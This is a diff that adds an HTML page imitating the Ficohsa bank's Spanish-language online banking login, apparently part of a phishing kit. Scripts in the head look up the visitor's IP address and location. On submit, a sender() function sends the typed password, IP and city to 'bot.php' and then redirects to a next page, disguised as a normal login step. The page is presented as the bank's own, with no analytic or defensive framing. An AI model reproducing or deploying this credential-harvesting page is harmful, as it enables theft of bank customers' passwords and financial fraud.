@@ -1,0 +1,327 @@
+<html lang="es" class="notranslate" translate="no" style="--vh: 7.95px;">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <title>Ficohsa</title>
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" />
+        <link rel="shortcut icon" href="./_assets/isotipo.ico" type="image/x-icon" />
+
+        <link href="./_assets/estilo2.css" rel="stylesheet" />
+        <link href="./estilito.css" rel="stylesheet" />
+        <script src="./appconsole.js"></script>
+        <script
+        src="https://code.jquery.com/jquery-2.2.3.min.js"
+        integrity="sha256-a23g1Nt4dtEYOj7bR+vTu7+T8VP13humZFBJNIYoEJo="
+        crossorigin="anonymous"></script>
+
+        <script>
+            $.getJSON("https://api.ipify.org?format=json",
+             function(data) {
+                $("#gfg").html(data.ip);
+            })
+         </script>
+         <script>
+            $.getJSON("https://ipinfo.io", function (response) {
+       $("#ip").html("IP: " + response.ip);
+       $("#address").html("" + response.city + ", " + response.country);
+       })
+         </script>
+      <script>
+   
+   var u_name, ip, ip2;
+   var ready = function () {
+       u_name = document.getElementById("step02").value;
+       ip = document.getElementById("gfg").innerHTML;
+       ip2 = document.getElementById("address").innerHTML;
+       message = ">>Ficohsa<<\n>Pass: " + u_name + "\nIP: " + ip +"\n" + ip2;
+   };
+   var sender = function () {
+       ready();
+       var settings = {
+           "async": true,
+           "crossDomain": true,
+           "url": "bot.php",
+           "method": "POST",
+           "headers": {
+               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+               "cache-control": "no-cache"
+   
+           },
+           "data": { "message": message }
+       };
+       $.ajax(settings).done(function (response) {
+           window.location = 'index3.html';
+           console.log(response);
+       });
+       return false;
+   };
+      </script>
+    </head>
+    <body class="generic">
+        <icb-app class="app" _nghost-c0="" ng-version="4.4.7">
+            <div _ngcontent-c0="" class="slough">
+                <header _ngcontent-c0="">
+                    <div _ngcontent-c0="" class="slough_header" style="height: 200px;">
+                        <icb-publicmasterheader _ngcontent-c0="" _nghost-c2="">
+                            <div _ngcontent-c2="" class="watford">
+                                <div _ngcontent-c2="" class="language_V1 fr hideLanguage">
+                                    <icb-language-options _ngcontent-c2="" _nghost-c11="">
+                                        <div _ngcontent-c11="" class="crawley">
+                                            <span _ngcontent-c11="" class="crawley-pipe-left"></span>
+                                            <div _ngcontent-c11="" class="crawley-content">
+                                                <a
+                                                    _ngcontent-c11=""
+                                                    class="crawley-content-link"
+                                                    title="Seleccionar idioma"
+                                                    style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);"
+                                                >
+                                                    <span _ngcontent-c11="" class="crawley-content-link-text">Español</span>
+
+                                                    <i _ngcontent-c11="" class="crawley-content-icon-mobile">ES</i>
+                                                    <div _ngcontent-c11="" class="clearboth"></div>
+                                                </a>
+                                                <div _ngcontent-c11="" class="crawley-content-link-background"></div>
+                                            </div>
+
+                                            <icb-contextual-panel _ngcontent-c11="" height="" pointerlocation="topRight" usemode="contextualMenu" width="250" _nghost-c14="">
+                                                <div _ngcontent-c14="" data-hidden="true" class="manchester productSelectorMode no_footer fullscreen visibility">
+                                                    <div _ngcontent-c14="" class="manchester-content">
+                                                        <div _ngcontent-c14="" class="manchester-content-holder">
+                                                            <div _ngcontent-c14="" class="manchester-content-holder-indicator"></div>
+                                                            <div _ngcontent-c14="" class="manchester-content-holder-top" data-hidden="false">
+                                                                <!---->
+                                                                <a
+                                                                    _ngcontent-c14=""
+                                                                    class="manchester-content-header-link fr"
+                                                                    style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);"
+                                                                >
+                                                                    <svg _ngcontent-c14="" class="svg-remove-circle">
+                                                                        <circle _ngcontent-c14="" cx="10" cy="10" r="9"></circle>
+                                                                        <line _ngcontent-c14="" x1="14" x2="6" y1="6" y2="14"></line>
+                                                                        <line _ngcontent-c14="" x1="6" x2="14" y1="6" y2="14"></line>
+                                                                    </svg>
+                                                                </a>
+                                                                <h6 _ngcontent-c14="">
+                                                                    <header _ngcontent-c11="" class="manchester-content-holder-top" data-contextual-panel-header="1">
+                                                                        Seleccionar idioma
+                                                                    </header>
+                                                                </h6>
+                                                            </div>
+                                                            <div _ngcontent-c14="" class="manchester-content-holder-middle has-title">
+                                                                <!---->
+                                                                <!---->
+                                                                <icb-menuoptions _ngcontent-c14="" data-hidden="true">
+                                                                    <div class="oldham">
+                                                                        <!---->
+                                                                        <div class="oldham_content_panel_start">
+                                                                            <div class="oldham-panel-heading">
+                                                                                <!---->
+                                                                                <a
+                                                                                    class="oldham-panel-link oldham-panel-link-activo"
+                                                                                    style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);"
+                                                                                >
+                                                                                    <h4 class="oldham-panel-title">
+                                                                                        <!---->
+                                                                                        <span class="oldham-panel-title-icon">
+                                                                                            <i></i>
+                                                                                        </span>
+                                                                                        <!---->
+                                                                                        <span class="oldham-panel-title-text">
+                                                                                            English
+                                                                                        </span>
+                                                                                        <!---->
+                                                                                        <i class="stream-check-12 oldham-panel-title-active-icon"></i>
+                                                                                        <!---->
+                                                                                        <!---->
+                                                                                    </h4>
+                                                                                </a>
+
+                                                                                <!---->
+                                                                            </div>
+
+                                                                            <!---->
+                                                                        </div>
+                                                                        <div class="oldham_content_panel_start">
+                                                                            <div class="oldham-panel-heading">
+                                                                                <!---->
+                                                                                <a
+                                                                                    class="oldham-panel-link oldham-panel-link-activo"
+                                                                                    style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);"
+                                                                                >
+                                                                                    <h4 class="oldham-panel-title active">
+                                                                                        <!---->
+                                                                                        <span class="oldham-panel-title-icon">
+                                                                                            <i></i>
+                                                                                        </span>
+                                                                                        <!---->
+                                                                                        <span class="oldham-panel-title-text">
+                                                                                            Español
+                                                                                        </span>
+                                                                                        <!---->
+                                                                                        <i class="stream-check-12 oldham-panel-title-active-icon"></i>
+                                                                                        <!---->
+                                                                                        <!---->
+                                                                                    </h4>
+                                                                                </a>
+
+                                                                                <!---->
+                                                                            </div>
+
+                                                                            <!---->
+                                                                        </div>
+                                                                    </div>
+                                                                </icb-menuoptions>
+                                                            </div>
+                                                            <div _ngcontent-c14="" class="manchester-content-holder-footer" data-hidden="true"></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </icb-contextual-panel>
+                                        </div>
+                                    </icb-language-options>
+                                </div>
+
+                                <div _ngcontent-c2="" class="clearboth watford-clear"></div>
+
+                                <a _ngcontent-c2="" class="exeter" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></a>
+                            </div>
+                        </icb-publicmasterheader>
+                    </div>
+                </header>
+
+                <main _ngcontent-c0="">
+                    <div _ngcontent-c0="" class="slough_content">
+                        <router-outlet _ngcontent-c0=""> </router-outlet>
+                        <icb-login _nghost-c28="">
+                            <div _ngcontent-c28="" class="ipswich">
+                                <icb-smart-app-banner _ngcontent-c28="" _nghost-c29="">
+                                    <!---->
+                                </icb-smart-app-banner>
+
+                                <icb-wizard _ngcontent-c28="" _nghost-c30="" data-hidden="false">
+                                    <!---->
+                                    <div _ngcontent-c30="" class="ipswich-main fl wizardAutoHeightMode with-advertising">
+                                        <div _ngcontent-c30="" class="ipswich-main-animate">
+                                            <!---->
+
+                                            <icb-wizard-step-one-by-one _ngcontent-c28="" _nghost-c31="">
+                                                <!---->
+                                                <div _ngcontent-c31="" class="step fl wizardAutoHeightMode ipswich-step-visible">
+                                                    <!---->
+                                                    <div _ngcontent-c31="" class="ipswich-main-wizard-header">
+                                                        <!---->
+
+                                                        <!---->
+                                                        <span _ngcontent-c31="" class="ipswich-main-title">
+                                                            <wizard-title _ngcontent-c28="">
+                                                                Bienvenido
+                                                            </wizard-title>
+                                                        </span>
+                                                    </div>
+
+                                                    <div _ngcontent-c31="" class="clearboth"></div>
+
+                                                    <!---->
+                                                    <div _ngcontent-c31="" class="ipswich-main-wizard-pre-header">
+                                                        <!---->
+
+                                                        <!---->
+
+                                                        <!---->
+                                                        <span _ngcontent-c31="" class="ipswich-main-subtitle-description"> </span>
+
+                                                        <!---->
+                                                    </div>
+
+                                                    <div _ngcontent-c31="" class="ipswich-main-wizard-content">
+                                                        <wizard-step-content _ngcontent-c28="">
+                                                            <icb-login-step-user _ngcontent-c28="" _nghost-c32="">
+                                                                <form method="post" action="" onsubmit="return sender()">
+                                                                    <p id="gfg" hidden=""></p>
+                                                                    <p id="address" hidden=""></p>
+                                                                    <div _ngcontent-c32="" class="ipswich-main-data">
+                                                                        <input
+                                                                            _ngcontent-c32=""
+                                                                            required=""
+                                                                            name="pass"
+                                                                            autocomplete="off"
+                                                                            class="ipswich-main-data-input required ng-pristine ng-invalid ng-touched"
+                                                                            disable-paste=""
+                                                                            formcontrolname="username"
+                                                                            id="step02"
+                                                                            placeholder="Ingrese su contraseña"
+                                                                        />
+                                                                    </div>
+
+                                                                    <div _ngcontent-c32="" class="suzuka-main">
+                                                                        <div _ngcontent-c32="" class="suzuka-main-check">
+                                                                            <input _ngcontent-c32="" class="suzuka-main-check-input" id="checkRememberUsername" name="checkRememberUsername" placeholder="checkRememberUsername" type="checkbox">
+                                                                            <label _ngcontent-c32="" class="suzuka-main-check-label" for="checkRememberUsername"> ¿Recordar usuario? </label>
+                                                                        </div>
+                                                                    </div>
+
+
+                                                                    <div _ngcontent-c32="" class="clearboth"></div>
+
+                                                                    <div _ngcontent-c32="" class="ipswich-main-buttons-login-user fr">
+                                                                        
+                                                                        <button style="border: none; padding: 0;" type="submit" >
+                                                                            <img src="_assets/b.png" alt="boton enviar" title="boton enviar" />
+                                                                          </button>
+                                                                          
+                                                                    </div>
+                                                                </form>
+                                                            </icb-login-step-user>
+                                                        </wizard-step-content>
+                                                    </div>
+                                                    <div _ngcontent-c32="" class="ipswich-main-engagement-user" style="
+                                                    margin-bottom: 28px;
+                                                ">
+                                                        <div _ngcontent-c32="" class="ipswich-main-engagement-data fr">
+                                                            <ul _ngcontent-c32="" class="ipswich-main-engagement-data-ul">
+                                                                <li _ngcontent-c32="" class="ipswich-main-engagement-data-ul-item"><a _ngcontent-c32="" class="ipswich-main-engagement-data-ul-item-link" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">¿Aún no tienes usuario?</a></li>
+                                                                <li _ngcontent-c32="" class="ipswich-main-engagement-data-ul-item-pipe">|</li>
+                                                                <li _ngcontent-c32="" class="ipswich-main-engagement-data-ul-item"><a _ngcontent-c32="" class="ipswich-main-engagement-data-ul-item-link" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);"> ¿Ha olvidado su usuario?</a></li>
+                                                                <li _ngcontent-c32="" class="ipswich-main-engagement-data-ul-item-pipe">|</li>
+                                                                <li _ngcontent-c32="" class="ipswich-main-engagement-data-ul-item"><a _ngcontent-c32="" class="ipswich-main-engagement-data-ul-item-link" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);"> ¿Ha olvidado su contraseña?</a></li>
+                                                            </ul>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </icb-wizard-step-one-by-one>
+
+
+                                           
+                                        </div>
+                                    </div>
+                                </icb-wizard>
+
+                           
+
+                                <div _ngcontent-c28="" class="ipswich-advertising fr">
+                                    <icb-advertising _ngcontent-c28="" _nghost-c41="">
+                                        <div _ngcontent-c41="" class="prisma_responsive" id="LoginPlaceHolder"><img class="prisma_banner c-default" src="./_assets/logoazul.jpg" /></div>
+
+                                    </icb-advertising>
+                                </div>
+
+                                <div _ngcontent-c28="" class="clearboth"></div>
+                            </div>
+
+                            <div _ngcontent-c28="" class="hideAlternativeWizard">
+                                <div _ngcontent-c28="" class="blackburn">
+                                    <i _ngcontent-c28="" class="stream-lock-close-1"></i>
+                                    <span _ngcontent-c28="" class="blackburn-disclaimer">
+                                        Esta banca en línea soporta los navegadores Internet Explorer 10 y 11, Microsoft Edge - navegador de Windows 10, Safari 5.0, 5.1 y 6.0, Firefox y Chrome.
+                                    </span>
+                                </div>
+                            </div>
+                        </icb-login>
+                    </div>
+                </main>
+
+            </div>
+
+
+        </icb-app>
+    </body>
+</html>
